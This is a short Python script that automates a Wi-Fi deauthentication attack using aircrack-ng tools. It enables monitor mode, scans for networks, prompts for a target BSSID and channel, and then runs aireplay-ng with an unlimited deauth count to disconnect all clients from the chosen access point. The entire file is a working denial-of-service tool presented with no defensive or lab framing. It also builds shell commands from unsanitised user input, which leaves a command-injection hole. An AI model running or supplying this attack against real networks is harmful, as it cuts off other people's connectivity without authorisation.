import os
import time

                  #network interface-mon#
# Run iwconfig command
os.system('iwconfig')
# Ask for network interface name
interface = input("What is your network interface name? ")
# Run airmon-ng start command
os.system('airmon-ng start ' + interface)
# Run airmon-ng check kill command
os.system('airmon-ng check kill ' + interface)
############################################################

def scan_wifi():
    os.system("airodump-ng " + interface) # Run airodump-ng for scanning
    time.sleep(1) # Sleep for 1 seconds
    os.system("pkill airodump-ng") # Stop airodump-ng after 1 seconds
    bssid = input("Enter the BSSID of the desired Wi-Fi: ")
    return bssid

def find_ch(bssid):
    ch = input("Enter the channel of the desired Wi-Fi: ")
    os.system(f"airodump-ng --bssid {bssid} -c {ch} " + interface) # final scan
    return ch

def deauth(bssid):
    os.system(f"aireplay-ng --deauth 0 -a {bssid} " + interface) # Run deauthentication attack

bssid = scan_wifi()
ch = find_ch(bssid)
time.sleep(1) # Sleep for 1 seconds before running deauthentication attack
deauth(bssid)
